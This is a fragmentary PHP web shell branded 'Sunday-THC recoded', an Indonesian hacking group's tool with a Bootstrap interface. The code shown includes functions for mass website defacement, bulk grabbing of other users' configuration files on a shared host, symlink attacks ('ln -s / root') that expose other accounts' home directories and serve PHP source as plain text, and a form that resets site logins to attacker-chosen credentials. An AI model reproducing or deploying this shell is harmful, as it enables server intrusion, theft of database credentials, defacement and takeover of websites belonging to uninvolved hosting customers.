...
/* Configurasi */
$aupas = '203385290fe310ae2f2e57f10d560832'; // Sunday-THC recoded
...
<html>
    <head>
        ...
        <meta name="copyright" content="{ Sunday-THC recoded }"/>
        <title>{ Sunday-THC recoded sHell }</title>
        <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/sunday-THC recoded.png"/>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
    </head>
    <body class="bg-dark text-center text-light">
        <div class="container text-center mt-3">
            <h1>{ SUNDAY-THC RECODED }</h1>
            <h5>xD</h5><hr/>
        ...
        <a href="https://facebook.com/Sunday-THC recodedOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { Sunday-THC recoded }</a>
    </body>
</html>
<?php
exit;
...
function about() {
    echo '<div class="card text-center bg-light about">
        <h4 class="card-header">{ Sunday-THC recoded }</h4>
        <div class="card-body">
            <center><div class="img"></div></center>
            <p class="card-text">{ Sunday-THC recoded } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
        </div>
        <div class="card-footer">
            <small class="card-text text-muted">Copyright 2019 { Sunday-THC recoded }</small>
        </div>
    </div><br/>';
    exit;
}
...
function aksiMasdef($dir, $file, $imgfol, $imgfile) {
    ...
    if ($_POST['start']) {
        ...
        echo "<form method='post'>
            ...
            <textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { Sunday-THC recoded }'></textarea><br/>
...
function aksiConfig($dir, $file) {
    if ($_POST) {
        $passwd = $_POST['passwd'];
        mkdir('sunday-THC recoded_config', 0777);
        $isi_htc = 'Options allnRequire NonenSatisfy Any';
        $htc = fopen('sunday-THC recoded_config/.htaccess', 'w');
        fwrite($htc, $isi_htc);
            ...
            if (is_readable($user_config_dir)) {
                ...
                foreach ($grab_config as $config => $nama_config) {
                    ...
                    if ($ambil_config == '') {
                        ...
                        $file_config = fopen("sunday-THC recoded_config/$user_con-$nama_config.txt", 'w');
        ...
        <a href='?dir=$dir/sunday-THC recoded_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
    } else {
        echo "<form method='post'>
...
function aksiSym($dir, $file) {
    ...
    //#htaccess
    if ($d0mains) {
        @mkdir('sunday-THC recoded_sym', 0777);
        @chdir('sunday-THC recoded_sym');
        @exe('ln -s / root');
            ...
            if (eregi('zone', $d0main)) {
                ...
                if (strlen(trim($domains[1][0])) > 2) {
                    ...
                    echo '<tr>
                            ...
                            <td>'.$user['name']."</td>
                            <td><a href='$full/sunday-THC recoded_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
                        </tr>";
                    flush();
                    $dcount++;
                }
        ...
        if ($TEST) {
            ...
            while (!feof($file)) {
                ...
                echo '<tr>
                        <td>'.$dcount.'</td>
                        <td>'.$matches."</td>
                        <td><a href=$full/sunday-THC recoded_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
                    </tr>";
                $dcount++;
            }
            fclose($file);
...
function aksiSymread($dir, $file) {
    ...
    if ($r3ad) {
        ...
        if ($sm) {
            $r3ad = @fopen('sunday-THC recoded_sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo ''.htmlentities($content).'';
        }
    }
...
function sym404($dir, $file) {
    $cp = get_current_user();
    if ($_POST['execute']) {
        @rmdir('sunday-THC recoded_sym404');
        @mkdir('sunday-THC recoded_sym404', 0777);
        $dir = $_POST['dir'];
        $isi = $_POST['isi'];
        @system('ln -s '.$dir.'sunday-THC recoded_sym404/'.$isi);
        @symlink($dir, 'sunday-THC recoded_sym404/'.$isi);
        $inija = fopen('sunday-THC recoded_sym404/.htaccess', 'w');
        @fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
        echo'<a href="/sunday-THC recoded_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
    } else {
...
function autoEdit($dir, $file) {
    if ($_POST['hajar']) {
        ...
        <form method='post'>
            ...
            <h5>Set User & Pass :</h5>
            <input type='text' name='user_baru' value='sunday-THC recoded' class='form-control mb-3' placeholder='Set Username'>
            <input type='text' name='pass_baru' value='sunday-THC recoded' class='form-control mb-4' placeholder='Set Password'>
    ...
    <body class="bg-dark text-light">
        ...
        <nav class="navbar static-top navbar-dark">
            ...
            <div class="collapse navbar-collapse" id="info">
                <ul>
                    <a href="https://facebook.com/Sunday-THC recodedOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
                    <a href="https://www.instagram.com/sunday-THC recoded.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
                    <a href="https://www.youtube.com/Sunday-THC recoded" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
                    <a href="https://github.com/sunday-THC recodedid" class="lain"><i class="fa fa-github tambah"></i></a>
                    <a href="https://sunday-THC recoded.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
                </ul>
            </div>
        </nav>
        <div class="container">
            <h1 class="text-center"><a href="https://facebook.com/Sunday-THC recodedOfficial" style="color:#ffffff;">{ SUNDAY-THC RECODED }</h1>
            <center><h5>XD</a></h5></center>
            <hr/>
            <div class="text-center">
                <div class="d-flex justify-content-center flex-wrap">
            ...
            <div class="col-md-7 mt-4">
                ...
                */
                ...
                <center><a class="text-muted" href="https://facebook.com/Sunday-THC recodedOfficial">Copyright 2019 { Sunday-THC recoded }</a></center><br/>
